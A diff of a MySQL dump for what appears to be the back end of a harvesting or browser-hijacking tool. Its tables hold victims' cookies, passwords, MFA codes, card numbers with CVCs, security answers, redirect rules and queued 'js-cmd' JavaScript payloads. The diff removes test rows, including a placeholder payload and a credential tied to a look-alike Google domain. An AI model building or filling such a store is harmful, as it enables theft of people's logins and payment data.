@@ -23,8 +23,8 @@ DROP TABLE IF EXISTS `BlacklistedWebsites`;
 /*!40101 SET @saved_cs_client     = @@character_set_client */;
 /*!40101 SET character_set_client = utf8 */;
 CREATE TABLE `BlacklistedWebsites` (
-  `URL` varchar(200) NOT NULL,
-  `RedirectURL` varchar(200) DEFAULT NULL,
+  `URL` varchar(2083) NOT NULL,
+  `RedirectURL` varchar(2083) DEFAULT NULL,
   PRIMARY KEY (`URL`)
 ) ENGINE=InnoDB DEFAULT CHARSET=latin1;
 /*!40101 SET character_set_client = @saved_cs_client */;
@@ -59,7 +59,7 @@ CREATE TABLE `Client` (
   `ZipCode` varchar(15) DEFAULT NULL,
   `State` varchar(40) DEFAULT NULL,
   PRIMARY KEY (`ID`)
-) ENGINE=InnoDB AUTO_INCREMENT=166 DEFAULT CHARSET=latin1;
+) ENGINE=InnoDB AUTO_INCREMENT=258 DEFAULT CHARSET=latin1;
 /*!40101 SET character_set_client = @saved_cs_client */;
 
 --
@@ -68,7 +68,6 @@ CREATE TABLE `Client` (
 
 LOCK TABLES `Client` WRITE;
 /*!40000 ALTER TABLE `Client` DISABLE KEYS */;
-INSERT INTO `Client` VALUES (108,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(109,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(110,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(111,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(112,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(113,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(114,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(115,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(116,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(117,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(118,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(119,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(120,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(121,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(122,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(123,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(124,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(125,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(126,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(127,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(128,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(129,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(130,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(131,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(132,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(133,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(134,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(135,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(136,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(137,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(138,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(139,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(140,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(141,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(142,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(143,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(144,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(145,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(146,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(147,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(148,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(149,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(150,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(151,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(152,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(153,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(154,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(155,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(156,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(157,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(158,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(159,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(160,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(161,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(162,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(163,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(164,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(165,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL);
 /*!40000 ALTER TABLE `Client` ENABLE KEYS */;
 UNLOCK TABLES;
 
@@ -81,8 +80,8 @@ DROP TABLE IF EXISTS `ComplexForms`;
 /*!40101 SET character_set_client = utf8 */;
 CREATE TABLE `ComplexForms` (
   `CID` int(10) unsigned NOT NULL,
-  `JSONFORM` varchar(400) NOT NULL,
-  `URL` varchar(200) DEFAULT NULL,
+  `JSONFORM` varchar(3068) NOT NULL,
+  `URL` varchar(2083) DEFAULT NULL,
   PRIMARY KEY (`CID`,`JSONFORM`),
   CONSTRAINT `ComplexForms_ibfk_1` FOREIGN KEY (`CID`) REFERENCES `Client` (`ID`) ON DELETE CASCADE ON UPDATE CASCADE
 ) ENGINE=InnoDB DEFAULT CHARSET=latin1;
@@ -106,8 +105,8 @@ DROP TABLE IF EXISTS `Cookies`;
 /*!40101 SET character_set_client = utf8 */;
 CREATE TABLE `Cookies` (
   `CID` int(10) unsigned NOT NULL,
-  `URL` varchar(200) NOT NULL,
-  `Content` varchar(300) DEFAULT NULL,
+  `URL` varchar(2083) NOT NULL,
+  `Content` text DEFAULT NULL,
   `Name` varchar(80) NOT NULL,
   PRIMARY KEY (`CID`,`URL`,`Name`),
   CONSTRAINT `Cookies_ibfk_1` FOREIGN KEY (`CID`) REFERENCES `Client` (`ID`) ON DELETE CASCADE ON UPDATE CASCADE
@@ -133,7 +132,7 @@ DROP TABLE IF EXISTS `Credentials`;
 CREATE TABLE `Credentials` (
   `Username` varchar(60) NOT NULL,
   `UserPassword` varchar(60) DEFAULT NULL,
-  `URL` varchar(200) NOT NULL,
+  `URL` varchar(2083) NOT NULL,
   `CID` int(10) unsigned NOT NULL,
   `MFA` varchar(100) DEFAULT NULL,
   PRIMARY KEY (`Username`,`URL`,`CID`),
@@ -148,7 +147,6 @@ CREATE TABLE `Credentials` (
 
 LOCK TABLES `Credentials` WRITE;
 /*!40000 ALTER TABLE `Credentials` DISABLE KEYS */;
-INSERT INTO `Credentials` VALUES ('becca',NULL,'https://www.googlemooo.com/',161,NULL);
 /*!40000 ALTER TABLE `Credentials` ENABLE KEYS */;
 UNLOCK TABLES;
 
@@ -160,11 +158,11 @@ DROP TABLE IF EXISTS `CreditCard`;
 /*!40101 SET @saved_cs_client     = @@character_set_client */;
 /*!40101 SET character_set_client = utf8 */;
 CREATE TABLE `CreditCard` (
-  `CreditCardNumber` int(10) unsigned NOT NULL,
+  `CreditCardNumber` varchar(20) NOT NULL,
   `CVC` char(3) DEFAULT NULL,
-  `ExpirationDate` date DEFAULT NULL,
+  `ExpirationDate` varchar(30) DEFAULT NULL,
   `CID` int(10) unsigned NOT NULL,
-  `Type` enum('American Express','Discover Card','Mastercard','VISA') DEFAULT NULL,
+  `Type` varchar(30) DEFAULT NULL,
   PRIMARY KEY (`CreditCardNumber`),
   KEY `CID` (`CID`),
   CONSTRAINT `CreditCard_ibfk_1` FOREIGN KEY (`CID`) REFERENCES `Client` (`ID`) ON DELETE CASCADE ON UPDATE CASCADE
@@ -188,7 +186,7 @@ DROP TABLE IF EXISTS `FormIDMappings`;
 /*!40101 SET @saved_cs_client     = @@character_set_client */;
 /*!40101 SET character_set_client = utf8 */;
 CREATE TABLE `FormIDMappings` (
-  `URL` varchar(200) DEFAULT NULL,
+  `URL` varchar(2083) DEFAULT NULL,
   `LocalDef` enum('Username','UserPassword','FirstName','LastName','CellPhone','StreetAddress','Email','SSN','BirthDate','URL','MFA','CreditCardNumber','CVC','ExpirationDate','Type','Question','Answer','City','ZipCode','State','Country') DEFAULT NULL,
   `RemoteDef` varchar(50) DEFAULT NULL
 ) ENGINE=InnoDB DEFAULT CHARSET=latin1;
@@ -200,7 +198,7 @@ CREATE TABLE `FormIDMappings` (
 
 LOCK TABLES `FormIDMappings` WRITE;
 /*!40000 ALTER TABLE `FormIDMappings` DISABLE KEYS */;
-INSERT INTO `FormIDMappings` VALUES ('*','FirstName','FirstName'),('*','LastName','LastName'),('*','CellPhone','phone'),('*','StreetAddress','StreetAddress'),('*','Email','email'),('*','SSN','ssn'),('*','BirthDate','DOB'),('*','URL','url'),('*','CreditCardNumber','ccn'),('*','CVC','cvc'),('*','ExpirationDate','exp'),('*','Type','type'),('*','Question','Q'),('*','Answer','A'),('*','City','city'),('*','State','state'),('*','ZipCode','ZipCode'),('*','Country','Country'),('*','Question','Q2'),('*','Question','Q3'),('*','FirstName','FirstName2'),('*','Country','Country2'),('*','Question','Q5'),('*','Question','Q4'),('*','Answer','A1'),('*','Answer','A2'),('*','Answer','A3'),('*','Username','username'),('*','MFA','mfa'),('*','Username','uname'),('*','Username','uname2'),('https://www.googlemooo.com/','Username','uname2');
+INSERT INTO `FormIDMappings` VALUES ('*','FirstName','FirstName'),('*','LastName','LastName'),('*','CellPhone','phone'),('*','StreetAddress','StreetAddress'),('*','Email','email'),('*','SSN','ssn'),('*','BirthDate','DOB'),('*','URL','url'),('*','CreditCardNumber','ccn'),('*','CVC','cvc'),('*','ExpirationDate','exp'),('*','Type','type'),('*','Question','Q'),('*','Answer','A'),('*','City','city'),('*','State','state'),('*','ZipCode','ZipCode'),('*','Country','Country'),('*','Question','Q2'),('*','Question','Q3'),('*','FirstName','FirstName2'),('*','Country','Country2'),('*','Question','Q5'),('*','Question','Q4'),('*','Answer','A1'),('*','Answer','A2'),('*','Answer','A3'),('*','Username','username'),('*','MFA','mfa'),('*','Username','uname'),('*','Username','uname2');
 /*!40000 ALTER TABLE `FormIDMappings` ENABLE KEYS */;
 UNLOCK TABLES;
 
@@ -225,7 +223,6 @@ CREATE TABLE `PendingPayloads` (
 
 LOCK TABLES `PendingPayloads` WRITE;
 /*!40000 ALTER TABLE `PendingPayloads` DISABLE KEYS */;
-INSERT INTO `PendingPayloads` VALUES (108,'{\"clientid\": 0, \"security_blacklist\": [], \"js-cmd\": [{\"pattern\": \"\", \"cmd\": \"nfdkjsnfkjdsnfjdsfndskjfndkjfnjdsnfjkndsjnfkjdsnfjdsnfndslakmdkwqlml dm smdsmmdskfmdslkmflkdsmflmdsflkdsmfdskfmdlskf\\nlkdsmfdmslkfmlkdsmlkdsmlfmdlksmfdsmflkdslkfmkrfmrmfmrlkflkdsfkls\\n\"}]}');
 /*!40000 ALTER TABLE `PendingPayloads` ENABLE KEYS */;
 UNLOCK TABLES;
 
@@ -240,7 +237,7 @@ CREATE TABLE `SecurityQuestions` (
   `CID` int(10) unsigned NOT NULL,
   `Question` varchar(80) NOT NULL,
   `Answer` varchar(80) DEFAULT NULL,
-  `URL` varchar(200) NOT NULL,
+  `URL` varchar(2083) NOT NULL,
   PRIMARY KEY (`CID`,`Question`,`URL`),
   CONSTRAINT `SecurityQuestions_ibfk_1` FOREIGN KEY (`CID`) REFERENCES `Client` (`ID`) ON DELETE CASCADE ON UPDATE CASCADE
 ) ENGINE=InnoDB DEFAULT CHARSET=latin1;
@@ -264,4 +261,4 @@ UNLOCK TABLES;
 /*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
 /*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;
 
--- Dump completed on 2018-12-02  1:53:00
+-- Dump completed on 2018-12-03  4:10:51
